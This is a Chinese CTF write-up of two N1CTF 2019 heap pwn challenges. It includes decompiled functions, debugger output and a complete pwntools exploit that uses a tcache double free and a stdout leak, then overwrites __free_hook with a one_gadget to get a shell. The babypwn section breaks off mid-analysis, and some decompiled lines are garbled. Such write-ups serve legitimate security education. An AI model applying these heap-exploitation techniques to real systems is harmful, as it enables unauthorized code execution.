## 0x01 前言
分享一下前天刚结束的N1CTF 2019的前两道pwn题，质量很好。主要考察tcache attack、fastbin
attack以及IO_stdout泄漏，都是菜单堆的老套路，但构造堆布局需要点技巧。
题目下载：  
链接: 密码:al7y
## 0x02 warmup
#### 分析
保护全开
    [*] '/pwn/warmup/warmup'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
漏洞点在`delete`函数，当`qword_202080[v1] == 0`，`ptr`指针则不被设置，这时候便会free掉一个未初始化的指针
    unsigned __int64 delete()
    {
      int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      printf("index:");
      v1 = sub_B4E();
      if ( v1 >= 0 && v1 = 0 && v1 >");
        sub_B02(ptr, 0x40);
        puts("done!");
      }
      else
      {
        puts("no such note!");
      }
      return __readfsqword(0x28u) ^ v2;
    }
通过以下过程构造uaf
  1. 调用modify，`ptr`指针指向某个正在使用的chunk
  2. delete掉指针列表`qword_202080`中未使用的项
  3. 这样该chunk进入fastbin，而指针仍然残留在`qword_202080`列表上
题目给的2.27版本libc，利用uaf构造double free，tcache attack写`_IO_2_1_stdout_`leak出libc地址
    gef➤  heap b
    ──────────────────────────────── Tcachebins for arena 0x7f05a8820c40 ────────────────────────────────
    Tcachebins[idx=3, size=0x40] count=4  ←  Chunk(addr=0x56377994d6c0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x7f05a8821760, size=0x7f05a881d2a0, flags=)  ←  [Corrupted chunk at 0xfbad2887]
    Tcachebins[idx=8, size=0x90] count=7  ←  Chunk(addr=0x56377994d6c0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x7f05a8821760, size=0x7f05a881d2a0, flags=)  ←  [Corrupted chunk at 0xfbad2887]
    Tcachebins[idx=63, size=0x400] count=1  ←  Chunk(addr=0x56377994d260, size=0x410, flags=PREV_INUSE)
泄漏出libc地址，减去偏移量拿到libc基址
    [DEBUG] Received 0x10e bytes:
        00000000  00 00 00 00  00 00 00 00  b0 28 82 a8  05 7f 00 00  │····│····│·(··│····│
        00000010  ff ff ff ff  ff ff ff ff  00 00 00 00  00 00 00 00  │····│····│····│····│
        00000020  80 07 82 a8  05 7f 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        *
        00000050  00 00 00 00  00 00 00 00  a0 d2 81 a8  05 7f 00 00  │····│····│····│····│
        00000060  87 38 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │·8··│····│····│····│
        00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        00000080  00 17 82 a8  05 7f 00 00  e3 17 82 a8  05 7f 00 00  │····│····│····│····│
        00000090  e3 17 82 a8  05 7f 00 00  e3 17 82 a8  05 7f 00 00  │····│····│····│····│
        000000a0  e4 17 82 a8  05 7f 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        000000b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        000000c0  00 00 00 00  00 00 00 00  00 0a 82 a8  05 7f 00 00  │····│····│····│····│
        000000d0  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
        000000e0  00 00 00 64  6f 6e 65 21  0a 31 2e 61  64 64 2e 0a  │···d│one!│·1.a│dd.·│
        000000f0  32 2e 64 65  6c 65 74 65  2e 0a 33 2e  6d 6f 64 69  │2.de│lete│.·3.│modi│
        00000100  66 79 2e 0a  34 2e 65 78  69 74 2e 0a  3e 3e        │fy.·│4.ex│it.·│>>│
        0000010e
    [*] libc.address 0x7f05a8435000
    [*] free_hook 0x7f05a88228e8
    [*] one_shot 0x7f05a8484322
最后，往`free_hook`写`one_gadget`拿shell
#### EXP
完整的EXP
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    import os, sys
    # Setting at first
    DEBUG = 1
    LIBCV = 2.19
    context.arch = "amd64"
    context.log_level = "debug"
    elf = ELF("./warmup",checksec=False)
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.ra = tube.recvall
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if DEBUG == 1:
        if context.arch == "i386":
            libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
        elif context.arch == "amd64":
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        s = process("./warmup")
    elif DEBUG == 2:
        if context.arch == "i386":
            libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86/libc.so.6",checksec=False)
            os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/x86/glibc-"+str(LIBCV)+"/x86/ld-linux-x86-64.so.2 warmup")
            os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86:/libc.so.6 warmup")
        elif context.arch == "amd64":
            libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/libc.so.6",checksec=False)
            os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/ld-linux-x86-64.so.2 warmup")
            os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64:/libc.so.6 warmup")
        s = process("./warmup")
    elif DEBUG == 3:
        libc = ELF("./libc-2.27.so",checksec=False)
        ip = "47.52.90.3" 
        port = 9999
        s = remote(ip,port)
    def menu(x):
        s.sla(">>", str(x))
    def add(data):
        menu(1)
        s.sa("content>>", data)
    def delete(idx):
        menu(2)
        s.sla("index:", str(idx))
    def modify(idx, data):
        menu(3)
        s.sla("index:", str(idx))
        s.sa("content>>", data)
    def pwn():
        add('A'*0x30)
        add('B'*0x30)
        add('C'*0x30)
        add('D'*0x30)
        add('E'*0x30)          # avoid tcache count overflow
        modify(4, "DDDD")
        delete(9)
        delete(9)
        delete(9)
        delete(4)
        #zx(0xB98)
        modify(0, 'a'*0x20 + p64(0) + p64(0x51))    # double free
        delete(9)
        delete(0)
        add('\xa0')
        add('EEEE')
        add(chr(0)*0x10+p64(0)+p64(0xa1))   # unsorted bin
        modify(1, 'D'*8)
        for i in range(7):
            delete(9)
        delete(9)
        modify(1, "\x60\x57")   # \x60
        delete(4)
        modify(3, 'DDDD')   # delete(3)
        delete(9)
        modify(3, '\xc0')
        add('DDDD')
        zx(0xB98) ##############
        add('DDDD')
        add(p64(0xfbad3887) + p64(0) * 3 + "\0")
        s.ru(p64(0xffffffffffffffff))
        s.r(8)
        libc.address = u64(s.r(6) + "\0\0") - 0x3eb780
        free_hook = libc.sym["__free_hook"]
        one_shot = libc.address + 0x4f322
        info("libc.address 0x%x", libc.address)
        info("free_hook 0x%x", free_hook)
        info("one_shot 0x%x", one_shot)
        #modify(7, p64(free_hook))
        delete(2)
        delete(3)
        delete(4)
        add(p64(free_hook))
        add('DDDD')
        add(p64(one_shot))
        delete(1)
        '''
        0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
        constraints:
        rcx == NULL
        0x4f322 execve("/bin/sh", rsp+0x40, environ)
        constraints:
        [rsp+0x40] == NULL
        0x10a38c    execve("/bin/sh", rsp+0x70, environ)
        constraints:
        [rsp+0x70] == NULL
        '''
        s.irt()
        #clean()
        # N1CTF{0359e2a5bf6222aa34bb22b7c099adda}
    if __name__ == "__main__":
        pwn()
pwn~  
## 0x03 babypwn
#### 分析
PIE未开启
    [*] '/root/workspace/elf/N1CTF_2019/pwn/babypwn/babypwn'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
漏洞在`delete`函数，free掉后未清空指针，存在uaf漏洞。
    nsigned __int64 sub_400B5C()
    {
      signed int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      printf("index:");
      v1 = sub_40094E("index:");
      if ( v1 > 9 )
      {
        puts("invalid index!");
        exit(0);
      }
      free(*((void **)buf[v1] + 2));
      return __readfsqword(0x28u) ^ v2;
    }
但add次数有限制，最多只能add 10 次，需要不断fastbin attack改到bss段去清空指针列表
    unsigned __int64 sub_4009A2()
    {
      _QWORD *v0; // rbx
      __int64 v2; // [rsp+0h] [rbp-20h]
      int v3; // [rsp+0h] [rbp-20h]
      signed int nbytes; // [rsp+4h] [rbp-1Ch]
      size_t nbytes_4; // [rsp+8h] [rbp-18h]
      nbytes_4 = __readfsqword(0x28u);
      LODWORD(v2) = 0;
      while ( (signed int)v2  255 )
        {
          puts("It's tooooooooo large!");
          exit(0);